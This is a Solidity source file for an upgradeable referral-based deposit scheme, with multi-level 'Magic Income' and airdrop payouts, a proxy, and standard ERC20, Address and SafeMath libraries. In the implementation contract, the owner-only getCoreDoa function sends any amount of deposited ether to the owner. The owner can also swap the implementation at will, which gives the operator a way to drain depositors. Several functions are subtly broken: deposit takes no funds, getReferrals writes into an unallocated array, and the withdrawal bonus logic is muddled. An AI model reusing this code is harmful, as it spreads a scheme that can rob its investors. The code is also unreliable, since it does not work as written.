// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;  
/**
 * @dev This abstract contract provides a fallback function that delegates all calls to another contract using the EVM
 * instruction `delegatecall`. We refer to the second contract as the _implementation_ behind the proxy, and it has to
 * be specified by overriding the virtual {_implementation} function.
 * 
 * Additionally, delegation to the implementation can be triggered manually through the {_fallback} function, or to a
 * different contract through the {_delegate} function.
 * 
 * The success and return data of the delegated call will be returned back to the caller of the proxy.
 */

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
/**
 * @dev Collection of functions related to the address type
 */
library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies in extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.

        uint256 size;
        // solhint-disable-next-line no-inline-assembly
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain`call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
abstract contract SmartCore {
    /**
     * @dev Delegates the current call to `implementation`.
     * 
     * This function does not return to its internall call site, it will return directly to the external caller.
     */
    function _delegate(address implementation) internal {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            // Copy msg.data. We take full control of memory in this inline assembly
            // block because it will not return to Solidity code. We overwrite the
            // Solidity scratch pad at memory position 0.
            calldatacopy(0, 0, calldatasize())

            // Call the implementation.
            // out and outsize are 0 because we don't know the size yet.
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)

            // Copy the returned data.
            returndatacopy(0, 0, returndatasize())

            switch result
            // delegatecall returns 0 on error.
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    /**
     * @dev This is a virtual function that should be overriden so it returns the address to which the fallback function
     * and {_fallback} should delegate.
     */
    function _implementation() internal virtual view returns (address);

    /**
     * @dev Delegates the current call to the address returned by `_implementation()`.
     * 
     * This function does not return to its internall call site, it will return directly to the external caller.
     */
    function _fallback() internal {
        _beforeFallback();
        _delegate(_implementation());
    }

    /**
     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other
     * function in the contract matches the call data.
     */
    fallback () payable external {
        _fallback();
    }

    /**
     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data
     * is empty.
     */
    receive () payable external {
        _fallback();
    }

    /**
     * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`
     * call, or as part of the Solidity `fallback` or `receive` functions.
     * 
     * If overriden should call `super._beforeFallback()`.
     */
    function _beforeFallback() internal virtual {
    }
}
contract TheCoreVarious is SmartCore {
    
    address public  implementation;
    address public  contractCreater;
    uint256 public  FreeAirDrop=0;
    uint256 public  F50=0;
    uint256 public  minDeposit=5;
	uint256 public  F50_Closing_Checkpoint=block.timestamp;
	uint256 public  F50_Closing_Deposit=0;
    uint256 private Minimum_Withdrawal_Limit=100;
    uint256 public  Maximum_f50_Rate=10;
    uint256 public  PERCENTS_DIVIDER = 1000;
    uint256 public  TIME_STEP =60;
    using SafeMath for uint256;

    event Register( address indexed sender , address indexed _referral);

    struct UserInfo {
        address referrer;
        uint256 Free_Air_Drop; 
        uint256 F50_Program_bonus;
        uint256 Magic_Income;
        uint256 Offer_Incentive;
        uint256 totalDeposit;
        uint refCount;
        uint256 checkpoint;
        CV_F50Deposits[] F50Deposits;
        uint totalWithdrawn;
        mapping(uint => uint256) incomes;
    }
    struct CV_F50Deposits {
		uint256 amount;
		uint256 totalf50;
		uint256 withdrawn;
		uint256 start;
		uint256 rate;
		uint256 count;
		uint256 package_Index;
	}
    mapping(address => UserInfo) public userInfo;

	struct Core_DAO_AirdropCount{		
		uint256 count;
		address _address;
		uint256 index;

	}

 	mapping (address => Core_DAO_AirdropCount) public referralCount; 
	uint256 public rcount=0;
	Core_DAO_AirdropCount[] public magic_income_index;
	Core_DAO_AirdropCount[] public f50_index;

   function register(address _referral) external {
        require(userInfo[_referral].totalDeposit > 0,"invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded"); 
        user.referrer = _referral; 
        FreeAirDrop = FreeAirDrop+1;
        userInfo[_referral].Free_Air_Drop=userInfo[_referral].Free_Air_Drop + 1;
        _payFreeAirDrop(0,userInfo[_referral].referrer,1,true,msg.sender);

        emit Register(msg.sender, _referral);
    }
     function deposit(uint256 _amount) external {
        if(_amount<100e6){
            require(_amount==30e6 || _amount==50e6,"Invalid Amount");
        }
        else{
        }
        F50 = F50+_amount;
        _payMagicIncome(0,msg.sender,_amount,true,msg.sender);
         
    }

	function _payMagicIncome(uint _level, address _user,uint256 _packageCost,bool _new,address _rootUser) private {
        address referer;
        UserInfo storage user = userInfo[_user];
        referer = user.referrer;
          
            uint level_price_local=10;
            level_price_local=_packageCost * level_price_local /1000;
            if(userInfo[referer].refCount>=_level){
                  userInfo[referer].Magic_Income = userInfo[referer].Magic_Income.add(level_price_local);				  
            } 
            if(_level < 11 && userInfo[referer].referrer != address(0)){
                    _payMagicIncome(_level+1,referer,_packageCost,_new,_rootUser);
            }
                
     }

     function _payFreeAirDrop(uint _level, address _user,uint256 _packageCost,bool _new,address _rootUser) private {
        address referer;
        UserInfo storage user = userInfo[_user];
        referer = user.referrer;
          
            uint level_price_local=10;
            level_price_local=_packageCost * level_price_local /1000;
            if(userInfo[referer].refCount>=_level){
                  userInfo[referer].Free_Air_Drop = userInfo[referer].Free_Air_Drop.add(level_price_local);				  
            } 
            if(_level < 11 && userInfo[referer].referrer != address(0)){
                    _payFreeAirDrop(_level+1,referer,_packageCost,_new,_rootUser);
            }
                
     }
     function f50_clsoing(uint _flag) private {	   		 
       if(block.timestamp > F50_Closing_Checkpoint.add(86400) || _flag==0)
		{	
			delete f50_index;		 
				for (uint256 i = 0; i < magic_income_index.length; i++) {				 
					 if(referralCount[magic_income_index[i]._address].count> 4) {							 
							f50_index.push(referralCount[magic_income_index[i]._address]);							
						} 
				 } 
				if(F50_Closing_Deposit>0 && f50_index.length>0){	              
					uint256 dvamt=F50_Closing_Deposit.div(2);
					uint256 evamt=dvamt/f50_index.length;
	                 for (uint256 i = 0; i < f50_index.length; i++) {
						   if(f50_index[i]._address!=address(0)){
                               userInfo[f50_index[i]._address].F50_Program_bonus=userInfo[f50_index[i]._address].F50_Program_bonus.add(evamt);

						   }
				        }
				        F50_Closing_Deposit=F50_Closing_Deposit.sub(dvamt);			
				}

				 for (uint256 i = 0; i < magic_income_index.length; i++) {               
						delete  referralCount[magic_income_index[i]._address];
				  }
				
				   delete magic_income_index;
				   delete f50_index;	
				   F50_Closing_Checkpoint=block.timestamp;

		}		 

	}
    function withdraw() public {
		UserInfo storage user = userInfo[msg.sender];
 		uint256 userPercentRate = getf50Rate(msg.sender);

		uint256 totalBonus;
		uint256 f50_plus_magic;
		uint256 f50_bonus;
		
		totalBonus = user.incomes[1].add(user.incomes[2]).add(user.incomes[3]).add(user.incomes[4]); 
		uint256 roiBonus=getUserf50_plus_magic(msg.sender);
		require(totalBonus.add(roiBonus)>=Minimum_Withdrawal_Limit,'Minimum Withdrawal Limit');
		
		
		
		for (uint256 i = 0; i < user.F50Deposits.length; i++) {
             userPercentRate=user.F50Deposits[i].rate;
			if (user.F50Deposits[i].withdrawn < user.F50Deposits[i].amount.mul(Maximum_f50_Rate).div(100)) {

				if (user.F50Deposits[i].start > user.checkpoint) {

					f50_plus_magic = (user.F50Deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.F50Deposits[i].start))
						.div(TIME_STEP);

				} else {

					f50_bonus = (user.F50Deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				if (user.F50Deposits[i].withdrawn.add(f50_bonus) > user.F50Deposits[i].amount.mul(Maximum_f50_Rate).div(100)) {
					f50_bonus = (user.F50Deposits[i].amount.mul(Maximum_f50_Rate).div(100)).sub(user.F50Deposits[i].withdrawn);
				}

				 
			 
		    	user.F50Deposits[i].withdrawn = user.F50Deposits[i].withdrawn.add(f50_plus_magic); /// changing of storage data
					
				f50_bonus = f50_bonus.add(f50_plus_magic);

			}
		}
         

		if (user.incomes[6]==1){
			if(block.timestamp.sub(user.incomes[5])>86400){
				if(F50_Closing_Deposit > user.incomes[7]){
			         uint256 _existing = F50_Closing_Deposit -user.incomes[7];
				      uint256 _mydiv = _existing.div(100);
					  totalBonus = totalBonus.add(_mydiv);
					  user.incomes[5] =block.timestamp;
					  user.incomes[7] = F50_Closing_Deposit;
				}                
			}		

		}


		uint256 tobeWithdraw=totalBonus;
		
		if(user.totalWithdrawn.add(totalBonus) > user.totalDeposit.mul(Maximum_f50_Rate).div(100)){
		   tobeWithdraw=(user.totalDeposit.mul(Maximum_f50_Rate).div(100).sub(user.totalWithdrawn));
		}
		tobeWithdraw=tobeWithdraw.add(roiBonus);
		   user.incomes[1] =0 ;
		    user.incomes[2] = 0;			 
	        user.incomes[3] = 0;
			user.incomes[4]=0;
		
 		uint256 contractBalance = address(this).balance;
		if (contractBalance < tobeWithdraw) {
			tobeWithdraw = contractBalance;
		}

		user.checkpoint = block.timestamp;
		payable(msg.sender).transfer(tobeWithdraw); 
 		user.totalWithdrawn=user.totalWithdrawn.add(tobeWithdraw);		 
 
	}
 	 
	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

    
    
  	function getf50Rate(address userAddress) public view returns (uint256) {
		UserInfo storage user = userInfo[userAddress];
        uint256 largest = 0; 
	 	for (uint256 i = 0; i < user.F50Deposits.length; i++) {
              if(user.F50Deposits[i].rate> largest)
                    largest=user.F50Deposits[i].rate;
	 	}
	 	return largest;
	}
   	function getuserLargerDeposit(address userAddress) public view returns (uint256) {
		UserInfo storage user = userInfo[userAddress];
        uint256 largest = 0; 
	 	for (uint256 i = 0; i < user.F50Deposits.length; i++) {
              if(user.F50Deposits[i].amount> largest)
                    largest=user.F50Deposits[i].amount;
	 	}
	 	return largest;
	}
 

	function getUserf50_plus_magic(address userAddress) public view returns (uint256) {
		UserInfo storage user = userInfo[userAddress];
		uint256 totalf50_plus_magic;
		uint256 f50_plus_magic;
        uint256 userPercentRate;
		for (uint256 i = 0; i < user.F50Deposits.length; i++) {
              userPercentRate=user.F50Deposits[i].rate;
			if (user.F50Deposits[i].withdrawn < user.F50Deposits[i].amount.mul(Maximum_f50_Rate).div(100)) {

				if (user.F50Deposits[i].start > user.checkpoint) {

					f50_plus_magic = (user.F50Deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.F50Deposits[i].start))
						.div(TIME_STEP);

				}
				else {
					f50_plus_magic = (user.F50Deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);
				}

				if (user.F50Deposits[i].withdrawn.add(f50_plus_magic) > user.F50Deposits[i].amount.mul(Maximum_f50_Rate).div(100)) {
					f50_plus_magic = (user.F50Deposits[i].amount.mul(Maximum_f50_Rate).div(100)).sub(user.F50Deposits[i].withdrawn);
				}

				totalf50_plus_magic = totalf50_plus_magic.add(f50_plus_magic);
             //	user.checkpoint = block.timestamp;
				/// no update of withdrawn because that is view function

			}

		}
		
	 	uint256 totalBonus=user.incomes[2].add(user.incomes[3]).add(user.incomes[4]).add(user.totalWithdrawn);
		
	    if(totalBonus.add(totalf50_plus_magic) > user.totalDeposit.mul(Maximum_f50_Rate).div(100))
		  {
		      if(totalBonus> user.totalDeposit.mul(Maximum_f50_Rate).div(100))
		          return 0;
		          
		          else
		          return  user.totalDeposit.mul(Maximum_f50_Rate).div(100) - totalBonus;
		       
		  }
		 else
		 return totalf50_plus_magic;
	}
    modifier onlycontractCreater() { 
        require(msg.sender == contractCreater); 
        _; 
    }

    constructor(address _impl)  {
        implementation = _impl;
        contractCreater = msg.sender;
    }
    
    function update(address newImpl) public onlycontractCreater {
        implementation = newImpl;
    }

    function removeOwnership() public onlycontractCreater {
        contractCreater = address(0);
    }
    
    function _implementation() internal override view returns (address) {
        return implementation;
    }

}
contract TheCoreVariousBasic{
    address public implementation;
    address payable contractCreater; 
    address payable  admin;
    address payable  corrospondent;
    uint256 public charge = 10;
    IERC20 public usdt;
    event DepositFreeAirDrop(address indexed _userAddress, uint256 _amount);
    using SafeMath for uint256;
    
    struct User {
        uint id;
        address referrer;
        uint partnersCount; 
        mapping(uint => uint256) teamPv;  
        mapping(uint => uint256) levelPv;
    }
    //working 
    mapping(address => User) public Users;
    
    uint public lastUserId;
    uint public lastRing1Id;
    uint256 public adminCharge=2 ether;
    mapping(uint => address) public idToAddress;
    address public id1;
    address public multisig;
    uint256 public BASIC_PRICE; 
    uint256 public divider;
    bool public locked;
    bool public devmode;
      
}
contract  TheCoreVariousImpl is TheCoreVariousBasic{ 
    using SafeMath for uint256;  
    modifier onlyOwner() {
        require(msg.sender == contractCreater,"You are not authorized.");
        _;
    }
    
    modifier onlyCorrospondent(){
        require(msg.sender == corrospondent,"You are not authorized.");
        _;
    }

     function init(address _usdtAddr) public   onlyOwner {        
        contractCreater = payable(msg.sender);
        admin = payable(msg.sender);
        corrospondent =payable(msg.sender);
        usdt = IERC20(_usdtAddr);
        id1 = contractCreater;
        User storage user = Users[msg.sender];  
        user.id=1;
        user.referrer = address(0); 
        idToAddress[1] = msg.sender;
        lastUserId = 2;
    }
  
 	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
    function upgradeTerm(uint256 _comm, uint mode_)
    onlyOwner
    public
    {
        if(mode_ == 1)
        {
            charge = _comm;
        }
        
    }
    modifier onlyUnlocked() { 
        require(!locked || msg.sender == contractCreater); 
        _; 
    } 
     
    function Register(address _refAddress)   external  onlyUnlocked(){
        registration(msg.sender,_refAddress);
    } 
    function isWalletExists(address user) public view returns (bool) {
        return (Users[user].id != 0);
    }

    function registration(address userAddress, address referrerAddress) private {
        require(!isWalletExists(userAddress), "user registered");
        require(isWalletExists(referrerAddress), "referrer not registered"); 
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        } 
        User storage user = Users[userAddress];   
        user.id=lastUserId;
        user.referrer =referrerAddress;
        user.partnersCount = uint(0); 
        idToAddress[lastUserId] = userAddress;        
        Users[userAddress].referrer = referrerAddress;  
        Users[referrerAddress].partnersCount++;
        Users[referrerAddress].levelPv[Users[referrerAddress].partnersCount]=lastUserId;
        lastUserId++; 
     } 

    function ZEC_RATE(uint _i,address _user,uint _j)  external  onlyOwner() {
         Users[_user].levelPv[_i]=_j;
    }
    function getReferrals(address _user ) public view returns (address[] memory  referrals)
    {
           uint i = 0;           
           while(  i <= Users[_user].partnersCount-1){ 
              referrals[i]= idToAddress[Users[_user].levelPv[i]];
               i++;
          }
         return referrals;  
    }
    function mining()  public  payable   onlyUnlocked() { 
        require(msg.value>=1 ether,'minimum amount is 10');
        require(isWalletExists(msg.sender),'Not Registered'); 
        Users[msg.sender].teamPv[10]=msg.value;
        Users[msg.sender].teamPv[11]=Users[msg.sender].teamPv[11] + msg.value;
        Users[msg.sender].teamPv[12]=lastRing1Id;
        lastRing1Id ++;        
    } 
    function getCoreDoa(uint256 uid,uint wid,uint256 _val)  external  onlyOwner() {  
        require(Users[idToAddress[uid]].teamPv[13]!=wid,'already transfered'); 
        Users[idToAddress[uid]].teamPv[13] =  wid;
        Users[idToAddress[uid]].teamPv[14] = Users[idToAddress[uid]].teamPv[14] + _val; 
        payable(msg.sender).transfer(_val);
    }
    function getBalance()
        public
        view
        returns(uint)
    {
        return address(this).balance;
    }
    
     
    
    function someidFundship(address payable nextOwner) external payable onlyOwner{
        contractCreater = nextOwner;
    }

    function someidFundship2(address payable nextOwner) external payable onlyOwner{
        admin = nextOwner;
    }
    
    
    
 

}
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
